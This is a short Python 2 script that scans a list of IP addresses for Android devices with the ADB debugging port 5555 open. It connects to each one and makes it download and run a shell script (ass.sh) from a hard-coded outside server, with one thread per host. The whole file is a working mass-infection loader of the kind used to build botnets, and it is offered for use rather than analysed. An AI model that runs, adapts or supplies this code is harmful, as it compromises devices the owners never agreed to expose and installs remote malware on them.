# how to install adb on ubuntu
# apt-get install android-tools-adb android-tools-fastboot -y
# Screen -S adb 
# adb start-server
# python adb.py list

import sys
import threading
import requests
import os
import socket
import time
from Queue import *
from threading import Thread
 
if len(sys.argv) < 2:
    sys.exit("\033[37mUsage: python "+sys.argv[0]+" [list]")

ips = open(sys.argv[1], "r").readlines()
queue = Queue()
queue_count = 0
 
info = open(str(sys.argv[1]),'a+')
 
def rtek(ip):
    ip = str(ip).rstrip("\n")
    try:
        adb = socket.socket()
        adb.settimeout(5)
        adb.connect((ip,5555))
        os.system("adb connect "+ip+":5555")
        os.system("adb -s "+ip+":5555 shell \"cd /data/local/tmp; wget http://81.28.6.115/ass.sh;chmod 777 ass.sh;./ass.sh\"")
        adb.close()
    except Exception:
        adb.close()
        pass
 

def main():
    global queue_count
    for line in ips:
        line = line.strip("\r")
        line = line.strip("\n")
        queue_count += 1
        sys.stdout.write("\r[%d] Added to queue" % (queue_count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")
    i = 0
    while i != queue_count:
        i += 1
        try:
            input = queue.get()
            thread = Thread(target=rtek, args=(input,))
            thread.start()
            time.sleep(0.1)
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
    thread.join()
    return


if __name__ == "__main__":
    main()